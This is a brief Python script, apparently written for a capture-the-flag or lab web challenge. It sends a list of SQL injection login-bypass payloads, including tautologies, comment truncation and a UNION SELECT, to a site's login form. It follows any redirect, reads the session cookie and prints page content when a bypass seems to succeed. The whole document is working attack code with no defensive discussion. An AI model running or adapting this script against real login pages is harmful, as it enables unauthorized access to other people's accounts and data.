import requests

base = 'https://web-random-cheese.tracebash.xyz'

# Test various SQL injection payloads for login bypass
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    '" OR "1"="1',
    "admin'--",
    "admin' #",
    "' UNION SELECT 1,'admin','secret'--",
]

for payload in payloads:
    s = requests.Session()
    r = s.post(f'{base}/login', data={'username': payload, 'password': 'test'}, allow_redirects=False)
    print(f'\nPayload: {payload}')
    print(f'Status: {r.status_code}, Location: {r.headers.get("Location")}')
    if r.status_code == 302:
        print('Redirect -> follow...')
        r2 = s.get(f'{base}/')
        print('Logged in as:', s.cookies.get('session')[:30] if s.cookies.get('session') else 'None')
        if 'Invalid' not in r2.text and 'Login' not in r2.text[:200]:
            print('POSSIBLE BYPASS!')
            print(r2.text[:1000].encode('ascii', errors='replace').decode('ascii'))
